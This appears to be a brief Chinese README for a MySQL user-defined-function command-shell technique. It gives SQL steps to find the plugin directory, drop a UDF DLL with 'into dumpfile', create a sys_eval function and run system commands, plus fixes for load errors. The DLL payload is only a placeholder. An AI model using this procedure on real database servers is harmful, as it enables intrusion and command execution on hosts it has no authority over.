# mysql_udf #

mysql udf eval/cmd shell

**只适用于MySQL > 5.1**
      
    一般过程
    
    >show variables like '%version%';       //查目标Mysql版本
    >show variables like '%plugin%';        //查目标plugin目录
    >select unhex(hex_udf) into dumpfile path/to/plugin/udf.dll;       //通过各种方法导入udf
    >create function sys_eval returns string soname 'udf.dll';         //创建函数
    >select sys_eval(cmd);                  //执行命令

**可能遇到的问题**

 * errno 2
        
        1. udf不存在(有可能被删)
       
 * errno 126
       
        1. 检查编译UDF用到的MySQL版本与目标MySQL版本是否对应
        2. 目标机器是否缺少各种包，如Microsoft Visual C++ redistrubutable (这条基本无解)

 * errno 193

        1. udf文件存在，但文件格式错误 (文件损坏)

